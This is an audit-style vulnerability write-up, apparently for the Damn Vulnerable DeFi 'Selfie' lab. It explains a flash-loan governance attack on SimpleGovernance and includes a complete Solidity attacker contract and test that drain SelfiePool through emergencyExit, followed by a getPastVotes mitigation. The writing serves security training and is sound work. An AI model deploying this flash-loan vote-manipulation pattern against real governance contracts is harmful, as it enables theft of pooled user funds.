### [H-1] Improper Snapshot Utilization in Voting Logic Allows Flash Loan Exploitation

**Description:** The `queueAction` function in the `SimpleGovernance` contract relies on the `getVotes` function to check if a user has sufficient voting power. However, `getVotes` uses the latest delegation checkpoint, which is susceptible to flash loan manipulation. This allows attackers to temporarily inflate their voting power by borrowing tokens, delegating votes to themselves, and queuing unauthorized governance actions.

Snapshot-based mechanisms, like getPastVotes, prevent this issue by referencing voting power at a specific block, ensuring that voting decisions reflect genuine token holdings over time rather than temporary manipulations.

```javascript
function queueAction(address target, uint128 value, bytes calldata data) external returns (uint256 actionId) {
    if (!_hasEnoughVotes(msg.sender)) {
        revert NotEnoughVotes(msg.sender); // Ensure sufficient voting power
    }

    // Logic for queuing the action...

    return actionId;
}
```

```javascript
function _hasEnoughVotes(address who) private view returns (bool) {
    uint256 balance = _votingToken.getVotes(who);
    uint256 halfTotalSupply = _votingToken.totalSupply() / 2;
    return balance > halfTotalSupply;
}
```

```javascript
function getVotes(address account) public view virtual returns (uint256) {
    return _delegateCheckpoints[account].latest();
}
```


**Impact:** By default, token balance does not account for voting power. This makes transfers cheaper. The downside is that it requires users to delegate to themselves in order to activate checkpoints and have their voting power tracked. So a user can take flashloan, activate a checkpoint by delegating to themselves, then call the `queueAction` successfully to withdraw funds from `SelfiePool::emergencyExit`

The exploit undermines the protocolâ€™s governance integrity by allowing attackers to bypass proper voting procedures. This can lead to unauthorized execution of critical actions, such as draining funds or modifying core protocol parameters, posing a severe risk to stakeholders.

**Proof of Concept:** 

1. Create an attacker contract that inherits `IERC3156FlashBorrower`
2. Call pool flashloan function from the attacker contract to borrow tokens
3. The previous line calls `onFlashLoan` and delegates votes using the tokens borrowed to attacker contract
4. It calls `queueAction` to queue `SelfiePool::emergencyExit` as an action to be performed on the `SelfiePool`
5. The action delay time passes and `executeAction` is called which sends all the tokens to the attacker contract.
6. `attacker::withdraw` sends all the tokens to the recovery address

**Proof of Code:**

Place the following into `Selfie.t.sol`

```javascript
function test_selfie() public checkSolvedByPlayer {
    Attacker attacker = new Attacker(governance, pool, token); //create attacker contract
    attacker.attack(); //call pool flashloan function
    vm.warp(block.timestamp + 2 days); //warp time by 2 days
    vm.roll(block.number + 3); //roll block by 3
    attacker.executeAction(1); //execute action
    attacker.withdraw(recovery); //send tokens to recovery address
}
```

And use this contract

```javascript
//SPDX-License-Identifier: MIT

pragma solidity =0.8.25;

import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {DamnValuableVotes} from "./DamnValuableVotes.sol";
import {SimpleGovernance} from "./SimpleGovernance.sol";
import {SelfiePool} from "./SelfiePool.sol";

contract Attacker is IERC3156FlashBorrower {
    SimpleGovernance public governance;
    SelfiePool public selfiePool;
    DamnValuableVotes private _votingToken;

    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");
    bytes private CALLDATA = abi.encodeWithSignature("emergencyExit(address)",address(this));

    constructor(SimpleGovernance _governance, SelfiePool _selfiePool,DamnValuableVotes _token) {
        governance = _governance;
        selfiePool = _selfiePool;
        _votingToken = _token;
    }

    function attack() public {
        selfiePool.flashLoan(this, address(_votingToken), selfiePool.maxFlashLoan(address(_votingToken)), "");
    }

    function onFlashLoan(address, address, uint256, uint256, bytes calldata) external returns (bytes32) {
        _votingToken.delegate(address(this));
        governance.queueAction(address(selfiePool),0,CALLDATA);
        _votingToken.approve(address(selfiePool),_votingToken.balanceOf(address(this)));
        return CALLBACK_SUCCESS;
    }

    function executeAction(uint256 actionId) external {
        governance.executeAction(actionId);
    }

    function withdraw(address _recovery) public {
        _votingToken.transfer(_recovery, _votingToken.balanceOf(address(this)));
    }
}
```

</details>

**Recommended Mitigation:** Replace `getVotes` with `getPastVotes` in the `_hasEnoughVotes` function. The `getPastVotes` function ensures that voting power is evaluated based on genuine holdings at the snapshot block, preventing flash loan exploitation.
